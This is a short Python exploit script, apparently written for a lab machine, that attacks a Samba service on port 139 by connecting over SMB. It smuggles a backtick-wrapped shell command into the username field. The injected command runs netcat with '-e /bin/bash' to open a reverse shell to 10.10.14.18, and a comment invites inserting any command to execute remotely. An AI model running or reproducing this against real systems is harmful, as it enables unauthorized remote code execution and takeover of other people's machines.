
#!/usr/bin/python3
# change IP and port to fit needs
TARGET_IP = "10.10.10.3"
TARGET_PORT = 139
from smb.SMBConnection import SMBConnection
# Insert any command you want to remotely execute on the target machine in between the ticks
user = "`" + "nc 10.10.14.18 9999 -e /bin/bash" + "`"
connclass = SMBConnection(user, "na", "na", "na", use_ntlm_v2=False)
assert connclass.connect(TARGET_IP, TARGET_PORT)
